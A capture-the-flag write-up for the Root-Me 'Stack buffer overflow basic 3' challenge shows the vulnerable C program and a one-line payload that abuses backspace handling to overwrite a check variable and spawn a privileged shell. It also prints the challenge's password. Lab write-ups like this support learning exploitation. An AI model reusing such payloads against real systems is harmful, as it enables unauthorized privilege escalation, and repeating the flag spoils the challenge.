# ELF x86 - Stack buffer overflow basic 3
- Point: 25pts
- Author: [Lyes](https://www.root-me.org/Lyes?lang=en),  10 April 2015
- Level: Medium <br><br>
![image](https://user-images.githubusercontent.com/48288606/143521039-c69b3f39-c52e-4551-b2fa-9facc7ca23cf.png)

## Write-up:
Look at the code:

```
#include <stdio.h>
#include <sys/time.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>
 
void shell(void);
 
int main()
{
 
  char buffer[64];
  int check;
  int i = 0;
  int count = 0;
 
  printf("Enter your name: ");
  fflush(stdout);
  while(1)
    {
      if(count >= 64)
        printf("Oh no...Sorry !\n");
      if(check == 0xbffffabc)
        shell();
      else
        {
            read(fileno(stdin),&i,1);
            switch(i)
            {
                case '\n':
                  printf("\a");
                  break;
                case 0x08:
                  count--;
                  printf("\b");
                  break;
                case 0x04:
                  printf("\t");
                  count++;
                  break;
                case 0x90:
                  printf("\a");
                  count++;
                  break;
                default:
                  buffer[count] = i;
                  count++;
                  break;
            }
        }
    }
}
 
void shell(void)
{
  setreuid(geteuid(), geteuid());
  system("/bin/bash");
}
```


Payload: `(python -c "print('\x08'*4+'\xbc\xfa\xff\xbf')";cat) | ./ch16`

Password: Sm4shM3ify0uC4n


